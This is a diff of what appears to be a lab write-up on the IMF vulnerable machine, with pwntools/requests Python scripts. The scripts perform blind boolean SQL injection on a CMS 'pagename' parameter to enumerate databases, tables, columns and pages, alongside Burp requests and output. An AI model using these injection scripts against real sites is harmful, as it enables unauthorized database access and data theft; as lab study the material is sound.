@@ -698,8 +698,6 @@ the lenght of each DBS, Tables, Columns
 to make a python script 
 
 ```python 
-#!/usr/bin/python3
-
 from pwn import *
 import requests, pdb, signal, time, sys, string
 
@@ -718,7 +716,7 @@ characters = string.ascii_lowercase + '-_'
 
 def makeRequest():
 
-    cookies = {'PHPSESSID': 'u85u4l0h0cho9ug97gqspsubp3'}
+    cookies = {'PHPSESSID': 'rftk9b1ducfunqjmrks8bcfb04'}
 
     database = ""
     p1 =log.progress("Fuerza bruta")
@@ -732,7 +730,7 @@ def makeRequest():
     for dbs in range(0, 6):
         for position_character in range(1, 30): 
             for character in characters:
-                sqli = main_url + f"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}"
+                sqli = main_url + f"'+and+(select+substring(schema_name,{position_character},1)+from+information_schema.schemata+limit+{dbs},1)='{character}"
 
                 p1.status(sqli)
 
@@ -743,13 +741,21 @@ def makeRequest():
                     p2.status(database)
                     break
 
-    database += ","
+            if database[-1:] == ",":
+                database += " "
+
+        if database[-1:] != "," and len(database) > 0:
+            database += ","
+
+    if database[-1:] == ",":
+        database = database[:-1]
+
+    p2.success(database)
 
 if __name__ == '__main__':
 
     makeRequest()
-
-
+    
 ```
 
 
@@ -965,4 +971,358 @@ Now we are going to define a function called "make_request".
 ```
 
 output
+```bash
+[ ] Fuerza bruta: http://192.168.100.52/imfadministrator/cms.php?pagename=home'+and+(select+substring(schema_name,29,1)+from+information_schema.schemata+limit+5,1)='_
+[+] Databases: information_schema,admin,mysql,performance_schema,sys,
+```
+now let's find the tables 
+```python
+   1   │ from pwn import *
+   2   │ import requests, pdb, signal, time, sys, string
+   3   │ 
+   4   │ def def_handler(sig,frame):
+   5   │     print("\n\n[!] Saliendo...\n")
+   6   │     sys.exit(1)
+   7   │ 
+   8   │ 
+   9   │ # Ctrl+C
+  10   │ signal.signal(signal.SIGINT, def_handler)
+  11   │ 
+  12   │ #Variables Globales
+  13   │ main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
+  14   │ characters = string.ascii_lowercase + '-_'
+  15   │ 
+  16   │ 
+  17   │ def makeRequest():
+  18   │ 
+  19   │     cookies = {'PHPSESSID': 'rftk9b1ducfunqjmrks8bcfb04'}
+  20   │ 
+  21   │     database = ""
+  22   │     p1 =log.progress("Fuerza bruta")
+  23   │     p1.status("Iniciando proceso de fuerza bruta")
+  24   │ 
+  25   │     time.sleep(2)
+  26   │ 
+  27   │     p2 = log.progress("Tables")
+  28   │ 
+  29   │ 
+  30   │     for dbs in range(0, 6):
+  31   │         for position_character in range(1, 30): 
+  32   │             for character in characters:
+  33   │                 sqli = main_url + f"'+and+(select+substring(table_name,{position_character},1)+from+information_schema.tables+where+table_schema='admin'+limit+{dbs},1)='{character}"
+  34   │ 
+  35   │                 p1.status(sqli)
+  36   │ 
+  37   │                 r = requests.get(sqli, cookies=cookies)
+  38   │ 
+  39   │                 if "Welcome to the IMF Administration." in r.text:
+  40   │                     database += character
+  41   │                     p2.status(database)
+  42   │                     break
+  43   │ 
+  44   │             if database[-1:] == ",":
+  45   │                 database += " "
+  46   │ 
+  47   │         if database[-1:] != "," and len(database) > 0:
+  48   │             database += ","
+  49   │ 
+  50   │     if database[-1:] == ",":
+  51   │         database = database[:-1]
+  52   │ 
+  53   │     p2.success(database)
+  54   │ 
+  55   │ 
+  56   │ if __name__ == '__main__':
+  57   │ 
+  58   │     makeRequest()
 
+```
+
+output
+
+```python3
+[▆] Fuerza bruta: http://192.168.100.52/imfadministrator/cms.php?pagename=home'+and+(select+substring(table_name,1,1)+from+information_schema.tables+where+table_schema='admin'+limit+2,1)='r
+[v] Tables: pages
+
+```
+now let's find the columns 
+
+```python3
+   1   │ from pwn import *
+   2   │ import requests, pdb, signal, time, sys, string
+   3   │ 
+   4   │ def def_handler(sig,frame):
+   5   │     print("\n\n[!] Saliendo...\n")
+   6   │     sys.exit(1)
+   7   │ 
+   8   │ 
+   9   │ # Ctrl+C
+  10   │ signal.signal(signal.SIGINT, def_handler)
+  11   │ 
+  12   │ #Variables Globales
+  13   │ main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
+  14   │ characters = string.ascii_lowercase + '-_'
+  15   │ 
+  16   │ 
+  17   │ def makeRequest():
+  18   │ 
+  19   │     cookies = {'PHPSESSID': 'rftk9b1ducfunqjmrks8bcfb04'}
+  20   │ 
+  21   │     database = ""
+  22   │     p1 =log.progress("Fuerza bruta")
+  23   │     p1.status("Iniciando proceso de fuerza bruta")
+  24   │ 
+  25   │     time.sleep(2)
+  26   │ 
+  27   │     p2 = log.progress("Columns")
+  28   │ 
+  29   │ 
+  30   │     for dbs in range(0, 6):
+  31   │         for position_character in range(1, 30): 
+  32   │             for character in characters:
+  33   │                 sqli = main_url + f"'+and+(select+substring(column_name,{position_character},1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+{dbs},1)='{character}"
+  34   │ 
+  35   │                 p1.status(sqli)
+  36   │ 
+  37   │                 r = requests.get(sqli, cookies=cookies)
+  38   │ 
+  39   │                 if "Welcome to the IMF Administration." in r.text:
+  40   │                     database += character
+  41   │                     p2.status(database)
+  42   │                     break
+  43   │ 
+  44   │             if database[-1:] == ",":
+  45   │                 database += " "
+  46   │ 
+  47   │         if database[-1:] != "," and len(database) > 0:
+  48   │             database += ","
+  49   │ 
+  50   │     if database[-1:] == ",":
+  51   │         database = database[:-1]
+  52   │ 
+  53   │     p2.success(database)
+  54   │ 
+  55   │ 
+  56   │ if __name__ == '__main__':
+  57   │ 
+  58   │     makeRequest()
+  
+  ```
+  
+  the output 
+  
+  ```python 
+  [▝] Fuerza bruta: http://192.168.100.52/imfadministrator/cms.php?pagename=home'+and+(select+substring(column_name,29,1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+5,1)='_
+[+] Columns: id,pagename,pagedata,
+  
+  ```
+  
+  now for the data is impotant to find where dbs are opened in this session 
+  
+  from  the BurpSuite /imfadministrator/cms.php?pagename=home'+and+(select+database())%3d'admin
+  
+  ```php
+  GET /imfadministrator/cms.php?pagename=home'+and+(select+database())%3d'admin HTTP/1.1
+
+Host: 192.168.100.52
+
+Upgrade-Insecure-Requests: 1
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+Referer: http://192.168.100.52/imfadministrator/cms.php?pagename=home
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: es-419,es;q=0.9
+
+Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
+
+Connection: close
+
+  ```
+  
+  output
+  
+  
+  ```php
+  <br /><br/>
+
+Welcome to the IMF Administration.</body>
+
+</html>
+
+
+  ```
+what happens if instead of admin we add another thing that is not true ?
+
+let's check 
+```php
+GET /imfadministrator/cms.php?pagename=home'+and+(select+database())%3d'adminoes HTTP/1.1
+
+Host: 192.168.100.52
+
+Upgrade-Insecure-Requests: 1
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+Referer: http://192.168.100.52/imfadministrator/cms.php?pagename=home
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: es-419,es;q=0.9
+
+Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
+
+Connection: close
+
+
+
+```
+output, that's how we make sure the databased selected. look we did not receive imf admin 
+
+```php
+HTTP/1.1 200 OK
+
+Date: Sun, 07 May 2023 03:01:59 GMT
+
+Server: Apache/2.4.18 (Ubuntu)
+
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+
+Cache-Control: no-store, no-cache, must-revalidate
+
+Pragma: no-cache
+
+Vary: Accept-Encoding
+
+Content-Length: 285
+
+Connection: close
+
+Content-Type: text/html; charset=UTF-8
+
+
+
+<html>
+
+<head>
+
+<title>IMF CMS</title>
+
+</head>
+
+<body>
+
+<h1>IMF CMS</h1>
+
+Menu: 
+
+<a href='cms.php?pagename=home'>Home</a> | 
+
+<a href='cms.php?pagename=upload'>Upload Report</a> | 
+
+<a href='cms.php?pagename=disavowlist'>Disavowed list</a> | 
+
+Logout
+
+<br /><br/>
+
+</body>
+
+</html>
+
+```
+
+
+now the database that this SQL is using is admin 
+
+so we can take an advantage of it and search for the content that is on pagename
+
+
+```php
+   1   │ from pwn import *
+   2   │ import requests, pdb, signal, time, sys, string
+   3   │ 
+   4   │ def def_handler(sig,frame):
+   5   │     print("\n\n[!] Saliendo...\n")
+   6   │     sys.exit(1)
+   7   │ 
+   8   │ 
+   9   │ # Ctrl+C
+  10   │ signal.signal(signal.SIGINT, def_handler)
+  11   │ 
+  12   │ #Variables Globales
+  13   │ main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
+  14   │ characters = string.ascii_lowercase + '-_'
+  15   │ 
+  16   │ 
+  17   │ def makeRequest():
+  18   │ 
+  19   │     cookies = {'PHPSESSID': 'rftk9b1ducfunqjmrks8bcfb04'}
+  20   │ 
+  21   │     database = ""
+  22   │     p1 =log.progress("Fuerza bruta")
+  23   │     p1.status("Iniciando proceso de fuerza bruta")
+  24   │ 
+  25   │     time.sleep(2)
+  26   │ 
+  27   │     p2 = log.progress("Data")
+  28   │ 
+  29   │ 
+  30   │     for dbs in range(0, 6):
+  31   │         for position_character in range(1, 30): 
+  32   │             for character in characters:
+  33   │                 sqli = main_url + f"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}"
+  34   │ 
+  35   │                 p1.status(sqli)
+  36   │ 
+  37   │                 r = requests.get(sqli, cookies=cookies)
+  38   │ 
+  39   │                 if "Welcome to the IMF Administration." in r.text:
+  40   │                     database += character
+  41   │                     p2.status(database)
+  42   │                     break
+  43   │ 
+  44   │             if database[-1:] == ",":
+  45   │                 database += " "
+  46   │ 
+  47   │         if database[-1:] != "," and len(database) > 0:
+  48   │             database += ","
+  49   │ 
+  50   │     if database[-1:] == ",":
+  51   │         database = database[:-1]
+  52   │ 
+  53   │     p2.success(database)
+  54   │ 
+  55   │ 
+  56   │ if __name__ == '__main__':
+  57   │ 
+  58   │     makeRequest()
+
+```
+
+
+output
+```php
+[┐] Fuerza bruta: http://192.168.100.52/imfadministrator/cms.php?pagename=home'+and+(select+substring(pagename,29,1)+from+pages+limit+5,1)='_
+[+] Data: disavowlist,home,tutorials-incomplete,upload
+
+```
+
+seems to be routes from our page because we saw them here in port 80
+
+
+```php
+
+IMF CMS
+Menu: Home | Upload Report | Disavowed list | Logout
+
+Welcome to the IMF Administration.
+
+```
+let's try them 
